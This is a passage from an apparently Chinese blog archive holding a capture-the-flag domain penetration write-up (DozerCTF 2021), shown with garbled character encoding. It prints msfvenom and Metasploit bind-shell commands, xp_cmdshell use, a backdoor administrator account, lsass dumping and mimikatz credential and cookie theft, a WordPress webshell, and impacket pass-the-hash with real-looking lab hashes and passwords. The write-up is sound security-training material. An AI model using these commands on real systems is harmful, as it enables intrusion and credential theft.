type=\"System.Web.Handlers.TransferRequestHandler\" preCondition=\"integratedMode,runtimeVersionv4.0\" /&gt; &lt;/handlers&gt; &lt;/system.webServer&gt; &lt;runtime&gt; &lt;assemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\"&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity name=\"Newtonsoft.Json\" publicKeyToken=\"30ad4fe6b2a6aeed\" culture=\"neutral\" /&gt; &lt;bindingRedirect oldVersion=\"0.0.0.0-9.0.0.0\" newVersion=\"9.0.0.0\" /&gt; &lt;/dependentAssembly&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity name=\"System.Web.Http\" publicKeyToken=\"31bf3856ad364e35\" culture=\"neutral\" /&gt; &lt;bindingRedirect oldVersion=\"0.0.0.0-5.2.3.0\" newVersion=\"5.2.3.0\" /&gt; &lt;/dependentAssembly&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity name=\"System.Net.Http.Formatting\" publicKeyToken=\"31bf3856ad364e35\" culture=\"neutral\" /&gt; &lt;bindingRedirect oldVersion=\"0.0.0.0-5.2.3.0\" newVersion=\"5.2.3.0\" /&gt; &lt;/dependentAssembly&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity name=\"Microsoft.Owin\" publicKeyToken=\"31bf3856ad364e35\" culture=\"neutral\" /&gt; &lt;bindingRedirect oldVersion=\"0.0.0.0-2.1.0.0\" newVersion=\"2.1.0.0\" /&gt; &lt;/dependentAssembly&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity name=\"System.Web.Cors\" publicKeyToken=\"31bf3856ad364e35\" culture=\"neutral\" /&gt; &lt;bindingRedirect oldVersion=\"0.0.0.0-5.2.3.0\" newVersion=\"5.2.3.0\" /&gt; &lt;/dependentAssembly&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity name=\"Microsoft.AspNet.SignalR.Core\" publicKeyToken=\"31bf3856ad364e35\" culture=\"neutral\" /&gt; &lt;bindingRedirect oldVersion=\"0.0.0.0-2.2.1.0\" newVersion=\"2.2.1.0\" /&gt; &lt;/dependentAssembly&gt; &lt;/assemblyBinding&gt; &lt;/runtime&gt; &lt;/configuration&gt; è§£ç ä¸€ä¸‹ ConnectionString å¯ä»¥å¾—åˆ°æ•°æ®åº“çš„è¿æ¥ä¿¡æ¯ã€‚ s = \"Zg3p37CSquO0slash0DelgBGFVO0J0BlhMxqbj6HR98UP8h4kojeoW8A0slash0xZh4im63w0tn2nuW7n5XRcDo0equals0\" s = s.replace(\"0add0\", \"+\").replace(\"0equals0\", \"=\").replace(\"0and0\", \"&amp;\").replace(\"0question0\", \"?\").replace(\"0slash0\", \"/\") print(s) # Zg3p37CSquO/DelgBGFVO0J0BlhMxqbj6HR98UP8h4kojeoW8A/xZh4im63w0tn2nuW7n5XRcDo= C# è§£ç  using System; using System.IO; using System.Security.Cryptography; using System.Text; namespace EncryptApplication { class Encrypt { static void Main(string[] args) { var _encryptKey = \"vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5\"; var _decryptKey = \"vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5\"; var _inputString = \"Zg3p37CSquO/DelgBGFVO0J0BlhMxqbj6HR98UP8h4kojeoW8A/xZh4im63w0tn2nuW7n5XRcDo=\"; var _outString = \"\"; var _noteMessage = \"\"; byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF }; try { var byKey = Encoding.UTF8.GetBytes(_decryptKey.Substring(0, 8)); var des = new DESCryptoServiceProvider(); var inputByteArray = Convert.FromBase64String(_inputString); var ms = new MemoryStream(); var cs = new CryptoStream(ms, des.CreateDecryptor(byKey, iv), CryptoStreamMode.Write); cs.Write(inputByteArray, 0, inputByteArray.Length); cs.FlushFinalBlock(); Encoding encoding = new UTF8Encoding(); _outString = encoding.GetString(ms.ToArray()); Console.WriteLine(\"DesEncrypt:\"); Console.WriteLine(_outString); } catch (Exception error) { _noteMessage 27 = error.Message; } } } } å¾—åˆ° DesEncrypt: server=10.10.1.231;uid=sa;pwd=msO.9uXC;database=site é¡ºä¾¿å†ç»ƒä¹ ä¸€ä¸‹ï¼Œæ•´ä¸ª msf ä¸Šçº¿å¥½äº†ã€‚ ç”±äºä¸å‡ºç½‘ä¸æ–¹ä¾¿æ‰“åå‘è¿æ¥ï¼Œè¿™é‡Œæ•´ä¸ªæ­£å‘è¿æ¥å§ã€‚ é¦–å…ˆåˆ©ç”¨ msfvenom ç”Ÿæˆä¸€ä¸ªæ­£å‘è¿æ¥çš„ payloadã€‚ msfvenom -p windows/meterpreter/bind_tcp LPORT=23333 -f exe -o 1.exe ä¸Šä¼ åæ‰§è¡Œå®ƒ ç„¶åæŸ¥çœ‹ä¸€ä¸‹ç½‘ç»œè¿æ¥ã€‚ netstat -ano å¯ä»¥çœ‹åˆ°æˆåŠŸç›‘å¬äº† 23333 ç«¯å£ã€‚è¯´æ˜å·²ç»è·‘èµ·æ¥äº†ã€‚ åœ¨ msf é‡Œæ‰§è¡Œç›‘å¬ã€‚ msfconsole use exploit/multi/handler set payload windows/meterpreter/bind_tcp set rhost 10.10.1.234 set lport 23333 exploit æ‹¿åˆ° Meterpreter ä¼šè¯ã€‚ 0x03 10.10.1.231 MSSQLé‚£å°±ç›´æ¥ä»æ•°æ®åº“è¿™é‡Œæ—¥å§ã€‚ ç›´æ¥ç”¨ xp_cmdshell æ‰§è¡Œå‘½ä»¤å¥½äº†ã€‚ ConnString: server=10.10.1.231;uid=sa;pwd=msO.9uXC;database=site;Provider=SQLOLEDB; å‘ç°å°±æ˜¯ç®¡ç†å‘˜ï¼Œå¥½å”‰ï¼ systeminfo çœ‹ä¸‹ç³»ç»Ÿä¿¡æ¯ã€‚ ä¸»æœºå: SQLSERVER14 OS åç§°: Microsoft Windows Server 2012 Standard OS ç‰ˆæœ¬: 6.2.9200 æš‚ç¼º Build 9200 OS åˆ¶é€ å•†: Microsoft Corporation OS é…ç½®: æˆå‘˜æœåŠ¡å™¨ OS æ„ä»¶ç±»å‹: Multiprocessor Free æ³¨å†Œçš„æ‰€æœ‰äºº: Windows ç”¨æˆ· æ³¨å†Œçš„ç»„ç»‡: äº§å“ ID: 00184-00070-00000-AAOEM åˆå§‹å®‰è£…æ—¥æœŸ: 2021/5/8, 21:38:55 ç³»ç»Ÿå¯åŠ¨æ—¶é—´: 2021/6/2, 22:38:53 ç³»ç»Ÿåˆ¶é€ å•†: VMware, Inc. ç³»ç»Ÿå‹å·: VMware Virtual Platform ç³»ç»Ÿç±»å‹: x64-based PC å¤„ç†å™¨: å®‰è£…äº† 2 ä¸ªå¤„ç†å™¨ã€‚ [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~1796 Mhz [02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~1796 Mhz BIOS ç‰ˆæœ¬: Phoenix Technologies LTD 6.00, 2019/7/29 Windows ç›®å½•: C:\\Windows ç³»ç»Ÿç›®å½•: C:\\Windows\\system32 å¯åŠ¨è®¾å¤‡: \\Device\\HarddiskVolume1 ç³»ç»ŸåŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½) è¾“å…¥æ³•åŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½) æ—¶åŒº: (UTC+08:00)åŒ—äº¬ï¼Œé‡åº†ï¼Œé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒºï¼Œä¹Œé²æœ¨é½ ç‰©ç†å†…å­˜æ€»é‡: 4,095 MB å¯ç”¨çš„ç‰©ç†å†…å­˜: 2,421 MB è™šæ‹Ÿå†…å­˜: æœ€å¤§å€¼: 8,191 MB è™šæ‹Ÿå†…å­˜: å¯ç”¨: 6,463 MB è™šæ‹Ÿå†…å­˜: ä½¿ç”¨ä¸­: 1,728 MB é¡µé¢æ–‡ä»¶ä½ç½®: C:\\pagefile.sys åŸŸ: dozer.org ç™»å½•æœåŠ¡å™¨: æš‚ç¼º ä¿®è¡¥ç¨‹åº: å®‰è£…äº† 2 ä¸ªä¿®è¡¥ç¨‹åºã€‚ [01]: KB2999226 [02]: KB4012214 ç½‘å¡: å®‰è£…äº† 1 ä¸ª NICã€‚ [01]: Intel(R) 82574L åƒå…†ç½‘ç»œè¿æ¥ è¿æ¥å: Ethernet0 å¯ç”¨ DHCP: å¦ IP åœ°å€ [01]: 10.10.1.231 [02]: fe80::f57d:729c:172a:abd6 Hyper-V è¦æ±‚: å·²æ£€æµ‹åˆ°è™šæ‹Ÿæœºç›‘æ§ç¨‹åºã€‚å°†ä¸æ˜¾ç¤º Hyper-V æ‰€éœ€çš„åŠŸèƒ½ã€‚ å¥½å®¶ä¼™ï¼Œè¿™å°æœºå™¨åœ¨åŸŸ: dozer.org é‡Œäº†ï¼ è¿™å› flag ç»ˆäºåœ¨ Administrator ç”¨æˆ·æ¡Œé¢ä¸Šäº†ã€‚ å¦å¤–è¿™ä¸ª DozerOCS.exe æ˜¯ä»€ä¹ˆç©æ„ï¼Ÿ Exec master.dbo.xp_cmdshell 'type C:\\Users\\Administrator\\Desktop\\flag.txt' DozerCTF{b305d6b074502f341e793c29d821cadd} ç„¶åå†è€ƒè™‘ä¸€ä¸‹è·å–ç”¨æˆ·å¯†ç ï¼Œè¯´ä¸å®šæœ‰åŸŸç®¡çš„ hashã€‚ tasklist çœ‹ä¸€çœ‹ï¼Œå‘ç°æœ‰æ€è½¯ã€‚ æ˜ åƒåç§° PID ä¼šè¯å ä¼šè¯# å†…å­˜ä½¿ç”¨ ========================= ======== ================ =========== ============ System Idle Process 0 Services 0 20 K System 4 Services 0 368 K smss.exe 332 Services 0 1,044 K csrss.exe 432 Services 0 5,964 K wininit.exe 512 Services 0 3,900 K csrss.exe 520 Console 1 27,296 K winlogon.exe 564 Console 1 6,688 K services.exe 608 Services 0 9,572 K lsass.exe 616 Services 0 13,740 K svchost.exe 708 Services 0 9,172 K svchost.exe 760 Services 0 6,852 K svchost.exe 808 Services 0 16,076 K dwm.exe 872 Console 1 48,020 K svchost.exe 884 Services 0 44,172 K svchost.exe 964 Services 0 13,484 K svchost.exe 660 Services 0 16,520 K svchost.exe 1108 Services 0 11,084 K spoolsv.exe 1276 Services 0 11,364 K svchost.exe 1312 Services 0 7,696 K sqlservr.exe 1340 Services 0 153,868 K sqlwriter.exe 1472 Services 0 5,824 K svchost.exe 1520 Services 0 12,036 K VGAuthService.exe 1544 Services 0 8,616 K vmtoolsd.exe 1580 Services 0 19,000 K svchost.exe 1600 Services 0 8,144 K avp.exe 1628 Services 0 26,532 K svchost.exe 2052 Services 0 4,724 K WmiPrvSE.exe 2248 Services 0 24,720 K dllhost.exe 2348 Services 0 10,420 K msdtc.exe 2564 Services 0 7,268 K avpui.exe 3076 Console 1 186,908 K taskhostex.exe 3132 Console 1 14,008 K explorer.exe 3240 Console 1 103,624 K vm3dservice.exe 3944 Console 1 3,588 K vmtoolsd.exe 3956 Console 1 32,316 K avpsus.exe 3184 Services 0 7,920 K WmiPrvSE.exe 2212 Services 0 6,128 K powershell.exe 1048 Console 1 71,740 K conhost.exe 3148 Console 1 28,332 K powershell.exe 3188 Console 1 71,192 K conhost.exe 2300 Console 1 27,784 K DozerOCS.exe 3728 Console 1 6,948 K svchost.exe 4828 Services 0 37,936 K csrss.exe 3572 RDP-Tcp#0 2 17,632 K winlogon.exe 3844 RDP-Tcp#0 2 5,840 K dwm.exe 4440 RDP-Tcp#0 2 31,812 K avpui.exe 4124 RDP-Tcp#0 2 664 K taskhostex.exe 4752 RDP-Tcp#0 2 8,980 K rdpclip.exe 2692 RDP-Tcp#0 2 6,404 K msiexec.exe 5100 Services 0 4,772 K explorer.exe 3296 RDP-Tcp#0 2 81,692 K ServerManager.exe 1176 RDP-Tcp#0 2 113,916 K WmiPrvSE.exe 1384 Services 0 10,948 K Taskmgr.exe 4444 RDP-Tcp#0 2 37,920 K vm3dservice.exe 2204 RDP-Tcp#0 2 3,516 K cmd.exe 3556 Services 0 2,084 K conhost.exe 4992 Services 0 2,908 K tasklist.exe 1196 Services 0 5,500 K avp.exe &lt;=&gt; Kaspersky å¡å·´æ–¯åŸº çœ‹ä¸‹ç½‘ç»œè¿æ¥ï¼Œæœ‰ 3389ï¼Œåº”è¯¥æ˜¯è¿œç¨‹æ¡Œé¢ã€‚ è¿™é‡Œå¤ç°çš„æ—¶å€™è¿˜å‘ç°æ²¡å¼€è¿œç¨‹æ¡Œé¢ï¼Œç„¶ååˆæŒ‰ç…§ 0x02 ä¸­çš„æ–¹æ³•å…ˆæ‰“å¼€â€¦â€¦ # netstat -ano æ´»åŠ¨è¿æ¥ åè®® æœ¬åœ°åœ°å€ å¤–éƒ¨åœ°å€ çŠ¶æ€ PID TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 796 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:1433 0.0.0.0:0 LISTENING 1304 TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 1388 TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:49152 0.0.0.0:0 LISTENING 524 TCP 0.0.0.0:49153 0.0.0.0:0 LISTENING 872 TCP 0.0.0.0:49154 0.0.0.0:0 LISTENING 928 TCP 0.0.0.0:49155 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:49177 0.0.0.0:0 LISTENING 620 TCP 0.0.0.0:49182 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:49238 0.0.0.0:0 LISTENING 1304 TCP 10.10.1.231:139 0.0.0.0:0 LISTENING 4 TCP 10.10.1.231:1433 10.10.1.234:49404 ESTABLISHED 1304 TCP 10.10.1.231:1433 10.10.1.234:49410 ESTABLISHED 1304 TCP 10.10.1.231:1433 10.10.1.234:49411 ESTABLISHED 1304 TCP 10.10.1.231:1433 10.10.1.234:49412 ESTABLISHED 1304 TCP 10.10.1.231:1433 10.10.1.234:49413 ESTABLISHED 1304 TCP 10.10.1.231:1433 10.10.1.234:49414 ESTABLISHED 1304 TCP 10.10.1.231:1433 10.10.1.234:49417 ESTABLISHED 1304 TCP 127.0.0.1:49192 127.0.0.1:49193 ESTABLISHED 1604 TCP 127.0.0.1:49193 127.0.0.1:49192 ESTABLISHED 1604 TCP 127.0.0.1:49194 0.0.0.0:0 LISTENING 1604 TCP 127.0.0.1:49195 127.0.0.1:49196 ESTABLISHED 1604 TCP 127.0.0.1:49196 127.0.0.1:49195 ESTABLISHED 1604 TCP 127.0.0.1:49220 127.0.0.1:49221 ESTABLISHED 3744 TCP 127.0.0.1:49221 127.0.0.1:49220 ESTABLISHED 3744 TCP 127.0.0.1:49226 127.0.0.1:49227 ESTABLISHED 1604 TCP 127.0.0.1:49227 127.0.0.1:49226 ESTABLISHED 1604 TCP [::]:80 [::]:0 LISTENING 4 TCP [::]:135 [::]:0 LISTENING 796 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:1433 [::]:0 LISTENING 1304 TCP [::]:3389 [::]:0 LISTENING 1388 TCP [::]:5985 [::]:0 LISTENING 4 TCP [::]:47001 [::]:0 LISTENING 4 TCP [::]:49152 [::]:0 LISTENING 524 TCP [::]:49153 [::]:0 LISTENING 872 TCP [::]:49154 [::]:0 LISTENING 928 TCP [::]:49155 [::]:0 LISTENING 636 TCP [::]:49177 [::]:0 LISTENING 620 TCP [::]:49182 [::]:0 LISTENING 636 TCP [::]:49238 [::]:0 LISTENING 1304 UDP 0.0.0.0:123 *:* 1000 UDP 0.0.0.0:500 *:* 928 UDP 0.0.0.0:3389 *:* 1388 UDP 0.0.0.0:4500 *:* 928 UDP 0.0.0.0:5355 *:* 520 UDP 0.0.0.0:64354 *:* 520 UDP 10.10.1.231:137 *:* 4 UDP 10.10.1.231:138 *:* 4 UDP 127.0.0.1:50457 *:* 2964 UDP 127.0.0.1:53687 *:* 2964 UDP 127.0.0.1:56295 *:* 928 UDP 127.0.0.1:59110 *:* 2964 UDP 127.0.0.1:61057 *:* 520 UDP 127.0.0.1:61059 *:* 636 UDP 127.0.0.1:61187 *:* 2964 UDP [::]:123 *:* 1000 UDP [::]:500 *:* 928 UDP [::]:3389 *:* 1388 UDP [::]:4500 *:* 928 UDP [::]:5355 *:* 520 UDP [::]:64354 *:* 520 ä¸ºäº†æ–¹ä¾¿ï¼Œå…ˆåŠ ä¸ªç”¨æˆ·ï¼Œç„¶å rdp ä¸Šå»çœ‹çœ‹ã€‚ net user /add root test456123! net localgroup administrators root /add å°è¯•åˆ›å»º lsass.exe çš„è½¬å‚¨æ–‡ä»¶ï¼Œç„¶è€Œåˆšç‚¹å°±è¢«ææ‰äº†ã€‚ ï¼ˆæ­¤å¤„å¥½æƒ³æŠŠå¡å·´æ–¯åŸºé€€å‡º æ ¹æ®å®˜æ–¹é¢˜è§£çš„è¯ï¼Œè¿™é‡Œçš„ DozerOCS.exe æ˜¯ Alice ç”¨æˆ·ï¼ˆä¹Ÿå°±æ˜¯ä¸‹æ–‡ä¸­ wordpress çš„ç”¨æˆ·ï¼‰èµ·çš„ï¼Œåº”è¯¥æ˜¯ dump è¿™ä¸ªçš„ ç„¶è€Œå’±å¤ç°çš„æ—¶å€™ tasklist é‡Œæ²¡è¿™ä¸ªç©æ„å•Šâ€¦â€¦ï¼ˆåº”è¯¥æ˜¯è¢«ä¹‹å‰è¿›æ¥çš„å¸ˆå‚…ä»¬æ—¥åäº† Orz åæ¥ç¯å¢ƒåˆé‡ç½®äº†ä¸€æ¬¡ï¼Œè¿™å›æœ‰äº†ï¼Œä¸Šé¢è¯´çš„ tasklist å·²ç»æ”¹æˆæ–°çš„äº†ã€‚ åˆ›å»ºè½¬å‚¨æ–‡ä»¶ã€‚ è¿™é‡Œç›´æ¥å€ŸåŠ© 234 æœºå™¨ä¸Šçš„æœ¨é©¬ï¼ŒæŠŠ dmp ä¼ åˆ° 234 æœºå™¨ä¸Šï¼Œæœ¬åœ°å†æ‹–å›æ¥ã€‚ è¿™é‡Œä¸Šä¼ çš„æ—¶å€™å‘ç°ç›´æ¥ä¸Šä¼ ä¼šæŠ¥é”™ï¼Œå‹ç¼©ä¹‹åå°±æ²¡äº‹äº†ã€‚ å…¶å®æ›´å¥½çš„æ–¹æ¡ˆæ¯”å¦‚ç”¨ powershell èµ·ä¸ª web æœåŠ¡ï¼Œæˆ–è€…æŠŠæ–‡ä»¶é€šè¿‡å‘½ä»¤è¡Œ post åˆ°å…¶ä»–æœºå™¨ä¸Šï¼Œå†æˆ–è€…ç”¨ net use æ‹–å›æ¥ï¼Ÿ strings DozerOCS.DMP | grep ldap å¾—åˆ° Alice çš„ç”¨æˆ·ä¿¡æ¯ã€‚ ldap://dc01.dozer.org:389|CN=AliceAlc,CN=Users,DC=dozer,DC=org|FkuWvj08 å¯†ç  FkuWvj08 å¦å¤–ï¼Œç”±äºæ²¡åšå…æ€ï¼Œè¿™å°æœºå™¨ä¸Š msf æœ¨é©¬è¢«æ€äº†ï¼ˆï¼ˆä¹‹åæœ‰æœºä¼šå†ç ”ç©¶ç ”ç©¶å…æ€å§ 0x04 10.10.1.121 DESKTOP-ALICEç›²çŒœç”¨æˆ·å Aliceï¼Œåˆ©ç”¨ä¸Šé¢å¾—åˆ°çš„å¯†ç ç™»å½• DESKTOP-ALICEã€‚ è¿™å°ä¹Ÿåœ¨åŸŸé‡Œã€‚ æ¡Œé¢ä¸Šå¾—åˆ° flagã€‚ åŒæ ·ï¼Œä¸Šçº¿ msf çœ‹äº†ä¸€ä¸‹è¿™å°ä¸Šé¢ä¹Ÿæ²¡æœ‰åŸŸç®¡çš„ hashã€‚ 0x05 10.10.1.250 WordPressç®¡ç†å‘˜ç”¨æˆ·åä¸º alice çœ‹çœ‹ 121 æœºå™¨ä¸­ Chrome çš„ Cookieï¼š C:\\Users\\ALICE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies æ•´ä¸ª mimikatz è·å–ä¸€ä¸‹ Cookieã€‚ dpapi::chrome /in:\"C:\\Users\\ALICE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\" /unprotect ç„¶è€Œå‘ç°å¤ç°çš„æ—¶å€™ç¯å¢ƒè¢«ç ´åæ‰äº†â€¦â€¦ï¼ˆå–µå‘œï¼ é¡ºä¾¿ä¹Ÿåœ¨ä¸Šé¢çœ‹åˆ°äº†ä¹‹å‰å¸ˆå‚…è¿›æ¥ç”¨ hack-browser-data.exe å¯¼å‡ºçš„æµè§ˆå™¨æ•°æ®ï¼Œç„¶è€Œä¹Ÿæ²¡ç”¨æ¥ç™»å½•çš„ cookie äº†â€¦â€¦ å¦å¤–è¿˜å‘ç°äº†ç”¨æˆ·åå’Œå¯†ç ã€‚ UserName,Password,LoginUrl,CreateDate Alice,Alice@Dozer@2021,http://10.10.1.250,2021-05-27T22:57:09+08:00 ç™»å½•è¿›æ¥äº†ã€‚ ç‰ˆæœ¬å· WordPress 5.2 æ’ä»¶ç®¡ç†å™¨é‡ŒåŠ ä¸ªä¸€å¥è¯æœ¨é©¬ã€‚ http://10.10.1.250/wp-content/plugins/hello.php flag åœ¨ wordpress ç”¨æˆ·æ¡Œé¢ã€‚ é¡ºä¾¿ä¸Šçº¿ msfã€‚ 0x06 10.10.1.1 DCåœ¨ 250 æœºå™¨ä¸ŠæŠŠå†…å­˜ä¸­çš„ç™»å½•ä¿¡æ¯ dump å‡ºæ¥ã€‚ æˆ–è€…ä¸Šå»ç”¨ mimikatz æ‰§è¡Œï¼Œå†æˆ–è€…æŠŠ lsass.exe dump ä¸‹æ¥æ‹–å›æœ¬åœ°å†æå–ä¹Ÿè¡Œã€‚ # ç›´æ¥åœ¨æœºå™¨ä¸ŠæŠ“å– mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords full\" exit # æ‹‰å›æœ¬åœ°å¤„ç† mimikatz.exe \"sekurlsa::minidump lsass.dmp\" sekurlsa::logonpasswords Authentication Id : 0 ; 27358144 (00000000:01a173c0) Session : Interactive from 4 User Name : DWM-4 Domain : Window Manager Logon Server : (null) Logon Time : 2021/5/31 14:34:20 SID : S-1-5-90-4 msv : [00000003] Primary * Username : WEB02$ * Domain : DOZER * NTLM : b943c070d6b172a110ac4a7a02cb0995 * SHA1 : 5974013dfc3df4584e32d923dcb67a36236926ee tspkg : wdigest : * Username : WEB02$ * Domain : DOZER * Password : 0]nCM-wq:#yu`.nHaH Kb^ Y4ehToFRWBT &amp;ZJVXNAhGHQI)QXAM4K-8_FY=sJ*DGwmoevtkPt60YT.EA%&lt;h&amp;!SQS]\"1`4Ruf6rrgi_J%1wy!0:%f*#b%@)U kerberos : * Username : WEB02$ * Domain : dozer.org * Password : 0]nCM-wq:#yu`.nHaH Kb^ Y4ehToFRWBT &amp;ZJVXNAhGHQI)QXAM4K-8_FY=sJ*DGwmoevtkPt60YT.EA%&lt;h&amp;!SQS]\"1`4Ruf6rrgi_J%1wy!0:%f*#b%@)U ssp : credman : Authentication Id : 0 ; 528906 (00000000:0008120a) Session : Interactive from 3 User Name : wordpress Domain : WEB02 Logon Server : WEB02 Logon Time : 2021/5/30 3:23:02 SID : S-1-5-21-304103692-1934564980-1899848695-1001 msv : [00000003] Primary * Username : wordpress * Domain : WEB02 * NTLM : b86fad0edf04a96244ec22959ce47d1d * SHA1 : f11df01e661b9f3da0736a850b82d6d5c3b65529 [00010000] CredentialKeys * NTLM : 85e6f9a1053b80f86820e4deaa351968 * SHA1 : f37f6af8dc2cfd74a967181db0376dc5d1197fb1 [00010000] CredentialKeys * NTLM : b86fad0edf04a96244ec22959ce47d1d * SHA1 : f11df01e661b9f3da0736a850b82d6d5c3b65529 tspkg : wdigest : * Username : wordpress * Domain : WEB02 * Password : Dozer@p4ssw0rd kerberos : * Username : wordpress * Domain : WEB02 * Password : (null) ssp : credman : DOZER\\WEB02$ ç”¨æˆ·è¯´ä¸å®šæœ‰æˆï¼Œå¯†ç å’Œ NTLM éƒ½æœ‰äº†ã€‚ ç„¶è€Œå‘ç°åˆ©ç”¨å®ƒå¹¶ä¸èƒ½ç™»ä¸ŠåŸŸæ§ 10.10.1.1 å•Šï¼ çœ‹äº†çœ‹ Administrators ç”¨æˆ·ç»„ï¼Œåº”è¯¥åŸŸç®¡æ˜¯è¿™ä¸ªæ‰å¯¹å§ï¼Œç„¶è€Œå†…å­˜é‡Œä¹Ÿæ²¡æœ‰åŸŸç®¡çš„ hash å•Šâ€¦â€¦ æ€•æ˜¯ç¯å¢ƒå·²ç»è¢«ä¹‹å‰è¿›æ¥çš„å¸ˆå‚…ä»¬æ…ä¹±äº†ã€‚ï¼ˆæ‘Šæ‰‹ ä¹ˆå¾—åŠæ³•ï¼Œåˆè€ƒè™‘åˆ°å¤§å¸ˆå‚…è¯´åŸŸæ§å°±æœ‰ MS17-010 è¿™ä¸ªæ´ï¼Œè¿™é‡Œå°±è¯•ç€æ‰“ä¸€æ‰“å§ã€‚è™½ç„¶è¯´æ˜¯è¿™æ ·éé¢„æœŸè§£â€¦â€¦ åœ¨ä¹‹å‰çš„æœºå™¨ä¼ äº†ä¸ª fscan ä¸Šå»å†æ‰«ä¸€æ³¢å†…ç½‘ï¼Œé¡ºä¾¿ç”¨ç®¡ç†å‘˜èº«ä»½æ‰«ä¸€æ³¢ ms17010. å¥½å®¶ä¼™ï¼Œä»–åŸŸæ§æœç„¶æœ‰æ´å•Šï¼ ï¼ˆè¿™é‡Œå¤ç°çš„æ—¶å€™å‘ç°åˆæ‰“ä¸é€šäº†ï¼Œç›´æ¥ç•¥å»ä¸å†™äº†å§ ç„¶ååˆ©ç”¨ impacket å·¥å…·ä¸­çš„ psexec.pyï¼Œå¯ä»¥é€šè¿‡ hash æ¥è¿æ¥è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚ å¯ä»¥å‚è€ƒ Impacket ç½‘ç»œåè®®å·¥å…·åŒ…ä»‹ç» psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9912e73b8ee265638b43d105fdb4c6f4 dozer/Administrator@10.10.1.1 ä¹±ç çš„è¯å…ˆæŒ‡å®šä¸€ä¸‹ç¼–ç  chcp 65001ï¼Œä½¿ç”¨ UTF-8 ç¼–ç ã€‚ åœ¨æ¡Œé¢ä¸Šæ‹¿åˆ° flagã€‚ mimikatz æŠ“å–å¯†ç ã€‚ mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords full\" exit å¾—åˆ° Administrator æ˜æ–‡å¯†ç  Admin890... åŒæ—¶ä¹Ÿå‘ç°äº†ä¸ª flag ç”¨æˆ·ã€‚ 0x07 10.10.1.100 Exchangeåˆ©ç”¨DOZER\\WEB02$ ç”¨æˆ·ä¿¡æ¯é€šè¿‡ ADExplorer64 è¿æ¥åˆ°åŸŸæ§ 10.10.1.1ï¼Œå¯ä»¥æŸ¥çœ‹ä¸€ä¸‹åŸŸå†…ä¿¡æ¯ã€‚ é‡Œé¢çœ‹åˆ°äº†ä¸ª flag ç”¨æˆ·ã€‚ ï¼ˆå®é™…ä¸ŠåŸŸå†…çš„ç”¨æˆ·éƒ½èƒ½è¿æ¥åŸŸæ§ï¼ŒæŸ¥çœ‹åŸŸå†…çš„ä¿¡æ¯â€¦â€¦ä¹‹å‰çš„ Alice ä¹Ÿå¯ä»¥ã€‚ ç”¨åŸŸç®¡çš„ Administrator ç™»å½• https://10.10.1.100/owa/ é‡Œé¢æœ‰ä¸ªè‰ç¨¿æç¤ºäº† flag éœ€è¦åœ¨ Dozerflagflagï¼ˆä¹Ÿå°±æ˜¯ flag@dozer.org ï¼‰ç”¨æˆ·é‡Œæ‰¾ã€‚å’Œä¸Šé¢çš„å‘ç°ç›¸ç…§åº”äº†ã€‚ æŒ‰ç…§å®˜æ–¹ writeup é‡Œçš„è¯´æ³•ï¼Œé¦–å…ˆåˆ©ç”¨åŸŸç®¡ Administrator ç™»å½• Exchange ç®¡ç†ä¸­å¿ƒï¼Œå³ https://10.10.1.100/ecp/ ç„¶åç»™ flag ç”¨æˆ·è®¾ç½®é‚®ç®±å§”æ‰˜ï¼ŒæŠŠ Administrator ç”¨æˆ·åŠ è¿›å»ã€‚ ç„¶åè®¿é—® https://10.10.1.100/owa/flag@dozer.org/ å³å¯æŸ¥çœ‹ flag ç”¨æˆ·çš„é‚®ä»¶ï¼Œä»è€Œæ‹¿åˆ° flagã€‚ 0x08 å°ç»“ç¬¬ä¸€æ¬¡æ‰“åŸŸæ¸—é€çš„é¢˜ç›®ï¼Œå¥½çˆ½å•Šï¼ æ„Ÿè°¢ä¸»åŠæ–¹æ­å»ºçš„åŸŸç¯å¢ƒï¼Œè®©å–µå–µæœ‰æœºä¼šå¥½å¥½ç©äº†ä¸€æ³¢ï¼ æ˜å¹´æœ‰æœºä¼šå†æ¥ç© qwqï¼ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/06/20/Pentest_2021DozerCTF/"},{"title":"CTF | 2021 NewsCTF 6.1èŒæ–°èµ› WriteUp","text":"å¼•è¨€ NEWSCTF 2021.6.1èŒæ–°èµ› æ¯”èµ›æ—¶é—´ï¼š2021.5.31 08:00 - 6.3 00:00 http://114.96.78.89:8000/ å”¯ä¸€å®˜æ–¹QQç¾¤ï¼š1063624041 å…­ä¸€é‚£å‡ å¤©æœ‰ä¸ªå°æ¯”èµ›ï¼Œä¸è¿‡å‰æ®µæ—¶é—´æ¯”è¾ƒå¿™æ²¡åšå‡ ä¸ªé¢˜ï¼Œä¹Ÿæ²¡ç©ºæ•´ç†ã€‚ 